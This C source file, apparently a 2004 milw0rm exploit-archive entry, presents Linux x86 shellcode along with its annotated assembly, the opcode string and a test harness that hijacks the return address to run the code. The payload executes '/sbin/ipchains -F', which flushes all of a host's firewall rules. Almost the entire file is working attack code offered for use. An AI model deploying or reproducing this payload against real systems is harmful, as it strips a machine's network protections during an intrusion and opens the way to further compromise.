#include <stdio.h>
#include <string.h>

/*
__asm__("

sub     $0x4,%esp   ## Con esto conseguimos que la shellcode nunca se
popl    %esp        ## sobreescriba... gracias RaiSe :)

xorl    %edx,%edx   ## %edx a cero
pushl   %edx        ## y ponemos los zeros del final del string en memoria
pushw   $0x462d     ## tenemos -F0000

movl    %esp,%esi   ## wardamos argv[1] en %esi

pushl   %edx        ## 0000-F0000

pushl   $0x736e6961
pushl   $0x68637069 ## ipchains0000-F0000

movl    %esp,%edi   ## wardamos argv[0] en %edi

pushl   $0x2f6e6962
pushl   $0x732f2f2f ## ///sbin/ipchains0000-F0000

movl    %esp,%ebx   ## en %ebx, el nombre de archivo

pushl   %edx        ## 0000///sbin/ipchains0000-F0000
pushl   %esi        ## A[1]0000///sbin/ipchains0000-F0000
pushl   %edi        ## A[0]A[1]0000///sbin/ipchains0000-F0000

movl    %esp,%ecx   ## %ecx apunta a el inicio del argv[]

xorl    %eax,%eax
movb    $0xb,%al
int     $0x80

");
*/

char c0de[]=
"\x83\xec\x04\x5c\x31\xd2\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x61\x69\x6e\x73"
"\x68\x69\x70\x63\x68\x89\xe7\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3"
"\x52\x56\x57\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";


/* execve("///sbin/ipchains",ARGV,NULL);
 * ARGV[] = {"ipchains","-F",NULL}
 */

int main(void)
{
	long *toRET;
	char vuln[52];

	*(&toRET+2) = (long *)c0de;

	strcpy(vuln, c0de);

	printf("Shellc0de length: %d\nRunning.......\n\n", strlen(c0de));
	return(0);
}

/* Sp4rK <sp4rk@netsearch-ezine.com>
 * UNDERSEC Security TEAM
 * NetSearch E-zine
 */

// milw0rm.com [2004-09-26]